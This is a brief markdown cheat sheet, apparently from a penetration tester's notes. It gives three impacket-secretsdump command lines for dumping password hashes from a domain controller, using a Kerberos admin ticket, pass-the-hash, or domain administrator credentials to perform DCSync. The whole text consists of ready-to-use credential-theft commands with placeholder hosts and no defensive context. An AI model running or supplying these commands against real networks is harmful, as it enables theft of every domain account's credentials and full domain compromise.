## Use this impacket module to dump hashes from the local machine, depending the context of usage

#### 1) impacket-secretsdump -k -no-pass DC.DOMAIN.COM (Use this if you have an admin TGT)

#### 2) impacket-secretsdump DC.DOMAIN.COM -hashes 'LM_HASH:NTLM_HASH' (Do DC sync via PtH)

#### 3) impacket-secretsdump 'DOMAIN.COM/administrator:PASSWORD'@DC_IP (Do DC Sync with Domain Admin credentials)
